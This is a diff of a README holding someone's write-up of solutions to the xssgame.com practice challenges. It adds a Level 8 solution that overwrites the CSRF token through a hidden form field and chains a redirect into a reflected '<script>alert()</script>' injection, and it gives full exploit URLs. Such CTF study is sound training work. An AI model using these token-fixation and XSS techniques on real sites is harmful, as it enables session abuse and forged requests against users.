@@ -1,5 +1,9 @@
 # [xssgame.com](http://xssgame.com/)
 
+My solutions for the XSS Game.
+I wasn't able to solve everything by myself.
+Took [inspiration from here](https://github.com/NotSurprised/XSSgame-Writeup/) for level 3, 7 and 8.
+
 ## Level 1
 
 The input is embedded as-is into the page that'll load next.
@@ -97,3 +101,32 @@ Which doesn't trigger the CSP, but triggers a GET request with the following res
 alert({"title":"Welcome to my Website!","pictures":["const.png"]})
 ```
 
+## Level 8
+
+There are two forms, the second requires a valid CSRF token to be passed along the request.
+The first one looks like this.
+
+```
+<form method="GET" action="set">
+    <input type="hidden" name="name" value="name">
+    <input size="30" name="value" placeholder="Please specify your name">
+    <input type="hidden" name="redirect" id="redirect" value="index">
+    <input type="submit" value="Set">
+</form>
+```
+
+There's a hidden input called `name` which is dangerous, it seems to allow setting of some parameter name on the backend instead of relying on a well-known value.
+
+Because of this shortcoming `http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=x&redirect=index` works, essentially setting the CSRF token (the response headers contains the token with the value `x`).
+
+To pass the challenge one navigation should do the trick, this is where the second form comes in the picture. Setting its `amount` parameter to `<script>alert()</script>` does the trick. Since the amount should be an integer a validation error message is injected into the page.
+
+```
+http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=&amount=%3Cscript%3Ealert%28%29%3C%2Fscript%3E&csrf_token=x
+```
+
+However to pass the challenge all has to be done in one go. Since the first form contains a `redirect` parameter we can do this. We must tack the following at the end: `encodeURIComponent('transfer?name=&amount=<script>alert()</script>&csrf_token=x')`.
+
+```
+http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=x&redirect=transfer%3Fname%3D%26amount%3D%3Cscript%3Ealert()%3C%2Fscript%3E%26csrf_token%3Dx
+```
